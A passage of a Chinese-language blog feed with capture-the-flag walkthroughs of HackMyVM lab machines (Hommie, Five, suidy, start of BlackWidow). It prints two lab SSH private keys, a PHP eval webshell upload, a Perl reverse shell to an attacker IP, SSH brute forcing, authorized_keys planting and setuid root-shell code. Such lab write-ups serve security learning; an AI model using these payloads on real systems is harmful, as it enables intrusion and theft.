ssh -i id\_rsa alexia@192.168.9.9
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.003.png" referrerpolicy="no-referrer"><br><br>alexia@hommie:~$ find / -perm -4000 2&gt;/dev/null
/opt/showMetheKey
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
alexia@hommie:~$ sudo -l
-bash: sudo: command not found
<br>lexia@hommie:/opt$ ./showMetheKey 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT
gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk
WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz
bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6
0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z
HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY
OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08
QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
alexia@hommie:/opt$ 
<br>这里给了一个私钥，经过验证这个就是alexia用户的<br>我们看逆向分析一下这个程序<br>nc -lp 1234 &gt;showmethekey //kali执行
nc 192.168.9.3 1234 &lt; showMetheKey //靶机执行
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.004.png" referrerpolicy="no-referrer"><br>读取环境变量中的Home 对应的私钥<br>那我们修改当前环境变量为我们想要获取私钥的用户即可<br>alexia@hommie:/opt$ export HOME=/root
alexia@hommie:/opt$ ./showMetheKey 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvBYog1I3rTTmtMw6i7oPRYy7yj8N6zNT3K9QhalnaTF+Md5NjbX5
hhNfZjO0tNbMGEeJtNTc3FpYWcAujrrd3jO5MzHUWAxQoyYYrZOFj2I5Fz/0RxD7e89H11
5nT7+CSUeddP/UeoyvSPgaruwrwD+dUl7+GiXo3sc5vsq3YufTYh1MlMKb/m7KmVk5n4Tk
/IFJwuuc3U4OZiRwXOmK4W2Gfo0Fonu6vFYmhpcCsi7V8g3hpVmOZIU8ZUtG1YbutCVbOC
EGyc1p5nbnyC0IIF5Y2EhjeevX8gmj4Kdv/y6yuvNdsJKm+ed2EEY9AymmPPwIpQshFwKz
Y0yB8N1jkQAAA8BiCyR9YgskfQAAAAdzc2gtcnNhAAABAQC8FiiDUjetNOa0zDqLug9FjL
vKPw3rM1Pcr1CFqWdpMX4x3k2NtfmGE19mM7S01swYR4m01NzcWlhZwC6Out3eM7kzMdRY
DFCjJhitk4WPYjkXP/RHEPt7z0fXXmdPv4JJR510/9R6jK9I+Bqu7CvAP51SXv4aJejexz
m+yrdi59NiHUyUwpv+bsqZWTmfhOT8gUnC65zdTg5mJHBc6YrhbYZ+jQWie7q8ViaGlwKy
LtXyDeGlWY5khTxlS0bVhu60JVs4IQbJzWnmdufILQggXljYSGN569fyCaPgp2//LrK681
2wkqb553YQRj0DKaY8/AilCyEXArNjTIHw3WORAAAAAwEAAQAAAQA/OvPDshAlmnM0tLO5
5YLczsMS6r+zIj4/InDffmPVaV4TRbisu1B3Umvv39IQOWXDg8k3kZfuPDEXexQrx4Zu/N
R18XqBXyJ8toH1WHK+ETdAKa/ldEAXD0gHjyUMGkWifQDiJF86E7GZxk6yH5NVvg0Vc/nY
sIXo3vD6wwuDo/gj+u4RRYMH3NYkLSj/O67cxGXnTOZPGzGsFTrE218BNtNqbRBR9/immU
irjugqebxY135Z4oECe/Hv4mP2e7n5QVO8FnYklQ4YU6y0ZTAMtjZCAhslXSKvaJPLjXuk
/HpdYhSoojm3vTAq/NT/oir0wA2ZYGdnF/Bxm6v/mntBAAAAgF2pqZEe9UqzcsAfOujr6z
DMRgPpl8qsdhDz6aftdg24AYmgXJ1D7PWUDpU6puO3VxJGrOwvcgD6xELRTxeFjd/2ssrh
4OO/kTvK4K0WVB/bnZ4y724iLcThfHDbzTTc5ckn45tyso8540iKha5ay1i24GwRPWddie
B/qcB1bHNOAAAAgQDmmptuwTRwUSiU1NtZRnJFvxvzLw6Wy/Cb2G+n5KY0ce5cYHT2HSIr
zsbPaDXQNBFy4iu1DAXAJJXTrxjOaAeLVYSb/8eZ1dhcgkxoAC8i2l6NwNmsjhGQKv++fV
qMfIdzVmriLXBZf7DU97YZeDIOrdOOV5CHhq+37i4xNdK18wAAAIEA0Mzc8HYvrXk4ecyi
KXP5u2Zxw2LADJ8DFeKWZmCUuNKFD1TuqdauxKxIVKVDaHvcnEr1bOiEBBso/X1CCtKjE+
12ZOWvqZ4fORxiNs9n/9YxlUSDAw7kyKd9H7dRRFdtb80OgDiwf18tDlEdboGWm/DR0NPq
gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=
-----END OPENSSH PRIVATE KEY-----
<br>复制写入私钥然后连接root
vi id\_rsa
chmod 600 id\_rsa
ssh -i id\_rsa root@127.0.0.1
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.005.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/7.hommie.html</link><guid isPermaLink="false">24-渗透/HMV/7.Hommie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/7.Hommie.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[6.Five]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 1.信息收集" data-href="#2. 1.信息收集" href="https://www.c1trus.top/about:blank#2._1.信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 1.信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 2.文件上传" data-href="#3. 2.文件上传" href="https://www.c1trus.top/about:blank#3._2.文件上传" class="internal-link" target="_self" rel="noopener nofollow">3. 2.文件上传</a>
<br><a data-tooltip-position="top" aria-label="4. 3.文件上传绕过" data-href="#4. 3.文件上传绕过" href="https://www.c1trus.top/about:blank#4._3.文件上传绕过" class="internal-link" target="_self" rel="noopener nofollow">4. 3.文件上传绕过</a>
<br><a data-tooltip-position="top" aria-label="5. 4.提权" data-href="#5. 4.提权" href="https://www.c1trus.top/about:blank#5._4.提权" class="internal-link" target="_self" rel="noopener nofollow">5. 4.提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Five
<br>作者：sml
<br>难度：⭐️⭐️⭐️
<br>知识点：文件上传目录绕过、SSH写公钥、SUDO提权(man、cp)
<br><br>┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sS 192.168.9.8  -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-05 12:48 CST
Nmap scan report for 192.168.9.8
Host is up (0.00038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:93:A4:57 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png" referrerpolicy="no-referrer"><br>目录扫描<br>┌──(root㉿kali)-[/home/kali/Desktop]
└─# gobuster dir -u http://192.168.9.8/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.9.8/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 185] [--&gt; http://192.168.9.8/uploads/]
/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.9.8/admin/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.002.png" referrerpolicy="no-referrer"><br>/uploads是空的。<br>看下/admin<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.003.png" referrerpolicy="no-referrer"><br>爆破一下<br>没有啥结果<br><br>访问/upload.html<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.004.png" referrerpolicy="no-referrer"><br>传一个马上去<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.005.png" referrerpolicy="no-referrer"><br>扫描目录发现有/uploads目录<br>大概率就是上传到这个目录了<br>访问发现有问题。修改文件后缀为txt 发现可以访问<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.006.png" referrerpolicy="no-referrer"><br>这应该是对文件格式进行了限制<br>尝试大小写绕过失败，<br><br>观察数据包<br>POST /upload.php HTTP/1.1
Host: 192.168.9.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Viewer/99.9.8782.87
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------170435815133440741313678117785
Content-Length: 509
Origin: http://192.168.9.8
Connection: keep-alive
Referer: http://192.168.9.8/upload.html
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Priority: u=0, i

-----------------------------170435815133440741313678117785
Content-Disposition: form-data; name="fileToUpload"; filename="1.php"
Content-Type: application/octet-stream

&lt;?php
eval($\_POST["pass"]);

-----------------------------170435815133440741313678117785
Content-Disposition: form-data; name="directory"

/uploads
-----------------------------170435815133440741313678117785
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------170435815133440741313678117785--
<br>可能是文件上传目录进行了限制。我们将/uploads修改为./<br>成功上传且可以访问<a rel="noopener nofollow" class="external-link" href="http://192.168.9.8/1.php" target="_blank">http://192.168.9.8/1.php</a><br>直接用哥斯拉连接上去<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.007.png" referrerpolicy="no-referrer"><br>重新上传一个系统马反弹shell<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.008.png" referrerpolicy="no-referrer"><br>pass=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.9.3%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.009.png" referrerpolicy="no-referrer"><br><br>(remote) www-data@five:/var/www/html$ find / -perm -4000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/man
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/more
(remote) www-data@five:/var/www/html$ sudo -l 
Matching Defaults entries for www-data on five:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on five:
    (melisa) NOPASSWD: /bin/cp
<br>www-data用户可以用melisa用户的CP命令权限<br>直接复制user.txt到1.txt并查看1.txt是不行的<br>因为1.txt也是属于melisa的文件。当前用户无法查看<br>我们要自己给自己创建一个属于自己的文件 然后复制user.txt到这个文件里面<br>而且还要先将这个文件给melisa用户读写权限。不然meilisa写不了<br>touch 1.txt
chmod a+rw 1.txt
sudo -u melisa cp /home/melisa/user.txt /tmp/1.txt
<br>5.提权root<br>当前用户除了melisa的cp权限就没有什么明显可以利用的东西了。我们直接借助cp写公钥给melisa 然后ssh上去<br>看一下ssh的配置<br>cat /etc/ssh/sshd\_config
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.010.png" referrerpolicy="no-referrer"><br>4444端口开放<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.011.png" referrerpolicy="no-referrer"><br>写公钥连接melisa用户<br>cd /tmp
ssh-keygen //生成公私钥
sudo -u melisa cp id\_rsa.pub /home/melisa/.ssh/authorized\_keys //写入公钥
ssh -i id\_rsa -p 4444 melisa@127.0.0.1
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.012.png" referrerpolicy="no-referrer"><br>melisa@five:~$ sudo -l
Matching Defaults entries for melisa on five:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User melisa may run the following commands on five:
    (ALL) SETENV: NOPASSWD: /bin/pwd, /bin/arch, /bin/man, /bin/id, /bin/rm, /bin/clear
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.013.png" referrerpolicy="no-referrer"><br>但是会发现使用 Sudo man man 无法执行命令<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.014.png" referrerpolicy="no-referrer"><br>这是因为分页模式不同，使用 less 分页即可执行命令<br>less分页模式<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.015.png" referrerpolicy="no-referrer"><br>sudo man -P /usr/bin/less man
!/bin/bash
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.016.png" referrerpolicy="no-referrer"><br>拓展<br>我们知道漏洞的原因是上传时允许我们修改目录绕过了他指定的上传目录/uploads<br>upload.php
&lt;?php

$target\_dir = $\_POST["directory"];
$target\_file = $target\_dir . basename($\_FILES["fileToUpload"]["name"]);
$uploadOk = 1;

// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
  echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
  if (move\_uploaded\_file($\_FILES["fileToUpload"]["tmp\_name"], $target\_file)) {
    echo "The file ". htmlspecialchars( basename( $\_FILES["fileToUpload"]["name"])). " has been uploaded.";
  } else {
    echo "Sorry, there was an error uploading your file.";
  }
}
?&gt;
<br>看一下uploads可以发现我们上传的Php马确实是上传成功了，但是却无法访问，这是为什么呢<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.017.png" referrerpolicy="no-referrer"><br>看下/etc/nginx/nginx.conf与/etc/nginx/sites-enabled/defaut<br>在/etc/nginx/sites-enabled/defaut 找到了原因<br>location ~\* /uploads/.\*.php$
{
return 403;
}
<br>这一部分配置明确禁止访问 /uploads/ 目录下的任何 PHP 文件，返回 403 Forbidden 错误。]]></description><link>https://www.c1trus.top/24-渗透/hmv/6.five.html</link><guid isPermaLink="false">24-渗透/HMV/6.Five.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.suidy]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 目录扫描" data-href="#2.1. 目录扫描" href="https://www.c1trus.top/about:blank#2.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 目录扫描</a>


<br><a data-tooltip-position="top" aria-label="3. 爆破文件" data-href="#3. 爆破文件" href="https://www.c1trus.top/about:blank#3._爆破文件" class="internal-link" target="_self" rel="noopener nofollow">3. 爆破文件</a>
<br><a data-tooltip-position="top" aria-label="4. ssh连接" data-href="#4. ssh连接" href="https://www.c1trus.top/about:blank#4._ssh连接" class="internal-link" target="_self" rel="noopener nofollow">4. ssh连接</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=suidy
<br>作者：sml
<br>难度：⭐️⭐️⭐️⭐️⭐️
<br>知识点：ffuf  hydra  SUID替换提权
<br><br>端口扫描<br>Nmap scan report for 192.168.9.7
Host is up (0.00015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B1:28:F4 (Oracle VirtualBox virtual NIC)
<br><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png" referrerpolicy="no-referrer"><br>没什么东西，只有一个robots.txt<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.002.png" referrerpolicy="no-referrer"><br>看下网页源码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.003.png" referrerpolicy="no-referrer"><br>看下rotbots.txt<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.004.png" referrerpolicy="no-referrer"><br>翻到最下面可以看到有一个目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.005.png" referrerpolicy="no-referrer"><br>访问目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.006.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.007.png" referrerpolicy="no-referrer"><br>那就是要我们爆破目录，获取到这个.txt文件<br>下载seclist字典<a rel="noopener nofollow" class="external-link" href="https://github.com/danielmiessler/SecLists" target="_blank">https://github.com/danielmiessler/SecLists</a><br><br>利用fuff工具进行爆破<br>ffuf -u http://192.168.9.7/shehatesme/FUZZ.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<br>这里爆破出了好多结果<br>加一个-od参数 输出到result目录<br>ffuf -u http://192.168.9.7/shehatesme/FUZZ.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -od result
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.008.png" referrerpolicy="no-referrer"><br>看一下输出的文件内容格式<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.009.png" referrerpolicy="no-referrer"><br>下面这个就是账户密码<br>我们利用正则表达式将其提取出来<br>tail -q -n 1 \* | sort | uniq | tee yhm.txt
<br>然后把斜杠替换成:<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.010.png" referrerpolicy="no-referrer"><br>hydra爆破
hydra -C ssh.txt  192.168.9.7 ssh
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.011.png" referrerpolicy="no-referrer"><br><br>ssh theuser@192.168.9.7
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.012.png" referrerpolicy="no-referrer"><br>\3. SUID替换提权<br>theuser@suidy:/home/suidy$ find / -perm -4000 2&gt;/dev/null
/home/suidy/suidyyyyy
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
<br>这里有一个suidyyyy 可执行文件<br>看下这个文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.013.png" referrerpolicy="no-referrer"><br>这里说明我们当前用户theuser对这个文件是有读写权限的。而且这个文件被设置了suid 与sgid<br>那我们将这个文件进行替换即可利用SUID执行任意文件<br>我们新建一个 power.c<br>#include &lt;stdio.h&gt;
int main() {
        setuid(0);           
        setgid(0);  
        system("/bin/bash -p");
        }
<br>gcc  power.c -o  suidyyyyy 编译
cp suidyyyyy /home/suidy/suidyyyyy 复制替换
./suidyyyyy 执行提权
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.014.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/5.suidy.html</link><guid isPermaLink="false">24-渗透/HMV/5.suidy.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[47.BlackWidow]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.3. FUZZ测试LFI" data-href="#2.3. FUZZ测试LFI" href="https://www.c1trus.top/about:blank#2.3._FUZZ测试LFI" class="internal-link" target="_self" rel="noopener nofollow">2.3. FUZZ测试LFI</a>
<br><a data-tooltip-position="top" aria-label="2.4. 日志包含getshell" data-href="#2.4. 日志包含getshell" href="https://www.c1trus.top/about:blank#2.4._日志包含getshell" class="internal-link" target="_self" rel="noopener nofollow">2.4. 日志包含getshell</a>


<br><a data-tooltip-position="top" aria-label="3. 提权viper用户" data-href="#3. 提权viper用户" href="https://www.c1trus.top/about:blank#3._提权viper用户" class="internal-link" target="_self" rel="noopener nofollow">3. 提权viper用户</a>
<br><a data-tooltip-position="top" aria-label="4. 提权root" data-href="#4. 提权root" href="https://www.c1trus.top/about:blank#4._提权root" class="internal-link" target="_self" rel="noopener nofollow">4. 提权root</a><br>
- <a data-tooltip-position="top" aria-label="4.1. 提权检测" data-href="#4.1. 提权检测" href="https://www.c1trus.top/about:blank#4.1._提权检测" class="internal-link" target="_self" rel="noopener nofollow">4.1. 提权检测</a><br>
- <a data-tooltip-position="top" aria-label="4.2. perl &amp; Capabilities提权" data-href="#4.2. perl &amp; Capabilities提权" href="https://www.c1trus.top/about:blank#4.2._perl_&amp;_Capabilities提权" class="internal-link" target="_self" rel="noopener nofollow">4.2. perl &amp; Capabilities提权</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=BlackWidow" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=BlackWidow</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=0xJin" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=0xJin" target="_blank">0xJin</a><br>
难度 ⭐️⭐️⭐️⭐️️
<br><br><br>┌──(root㉿kali)-[~/Desktop/hmv/blackwindow]
└─# nmap -sCV 192.168.56.23 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 23:37 EST
Nmap scan report for 192.168.56.23
Host is up (0.00068s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA)
|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA)
|_  256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519)
80/tcp    open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
